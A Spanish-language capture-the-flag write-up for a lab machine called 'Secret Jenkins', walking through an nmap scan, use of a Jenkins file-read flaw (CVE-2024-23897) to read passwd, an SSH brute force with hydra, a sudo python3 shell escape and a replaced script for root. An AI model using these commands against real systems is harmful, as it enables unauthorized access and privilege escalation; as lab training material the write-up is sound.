# MÁQUINA SECRET JENKINS

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto.jpg)

Observamos que está abiertos tanto el puerto 22, como el 8080. Vamos a ver el contenido de este último:

![WEB](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto2.jpg)

Nos encontramos ante la página de login de un Jenkins, podemos utilizar el comando whatweb para obtener la versión de Jenkins que está corriendo:

```shell
whatweb http://172.17.0.2:8080
```

![VER](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto3.jpg)

Ya tenemos la versión, por lo que vamos a buscar sui hay alguna vulnerabilidad de la que nos podamos aprovechar:

https://github.com/Maalfer/CVE-2024-23897

![PASS](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto4.jpg)

Podíamos leer ficheros internos de la máquina, al leer el passwd vemos que hay 2 usuarios que pueden interesarnos, pinguinito y bobby. Así que vamos a hacer un ataque de fuerza bruta para intentar obtener la contraseña de alguno de ellos:

```shell
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![HYD](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto5.jpg)

Ahí tenemos la contraseña de bobby, vamos a acceder a la máquina a través de SSH:

![SSH](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto6.jpg)

Si ejeuctamos el comando sudo -l vemos que podemos ejecutar python3 como el usuario pinguinito, vamos a ver como se hace buscando en GTFOBins:

https://gtfobins.github.io/gtfobins/python/#sudo

```shell
sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```

![PING](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto7.jpg)

Ya somos el usuario pinguinito, veamos que podemos ejecutar como otro usuario con sudo -l:

![SC](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto8.jpg)

Vemos que no podemos modificar ese script, lo que deberemos de hacer será eliminar el script que ya existe y subirnos uno desde nuestra máquina víctima que contenga el código para escalar privilegios:

```shell
import os

os.system('/bin/bash')
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Secret%20Jenkins/foto9.jpg)





